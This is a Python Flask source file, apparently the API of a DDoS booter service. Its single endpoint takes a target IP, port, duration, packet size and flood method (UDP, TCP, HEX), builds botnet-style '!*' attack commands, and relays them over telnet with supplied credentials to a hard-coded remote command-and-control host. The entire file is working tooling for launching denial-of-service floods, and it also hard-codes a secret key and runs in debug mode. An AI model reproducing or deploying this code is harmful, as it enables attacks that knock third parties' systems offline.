from flask import Flask, request
import telnetlib
import os

app = Flask(__name__)

HOST = "185.139.228.245"
PORT = 420

AUTH_KEY = "_YAF:EFDihQd"

@app.route("/run_command", methods=["POST"])
def run_command():
    auth_key = request.args.get("auth_key")
    if(auth_key != AUTH_KEY):
        return("Unauthorized", 401)

    user = request.args.get("username")
    password = request.args.get("password")
    method = request.args.get("method")
    ip = request.args.get("ip")
    port = request.args.get("port")
    time = request.args.get("time")
    size = request.args.get("size")

    if(method == "UDP"):
        command = "!* " + method + " " + ip + " " + port + " " + time + " 32 " + size + " 10"
    elif(method == "TCP"):
        command = "!* " + method + " " + ip + " " + port + " " + time + " 32 all " + size + " 10"
    elif(method == "HEX"):
        command = "!* " + method + " " + ip + " " + port + " " + time + " " + size
    elif(method == "STOP"):
        command = "!* STOP"
    
    print(command)

    tn = telnetlib.Telnet(HOST, PORT)
    tn.read_until(b"Username > ")
    tn.write(user.encode('ascii') + b"\n")
    tn.read_until(b"Password > ")
    tn.write(password.encode('ascii') + b"\n")

    tn.write(command.encode('ascii') + b"\n")

    tn.close()

    return("Command Has Been Sent", 200)

port = int(os.environ.get("PORT", 5000))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=port, debug=True)
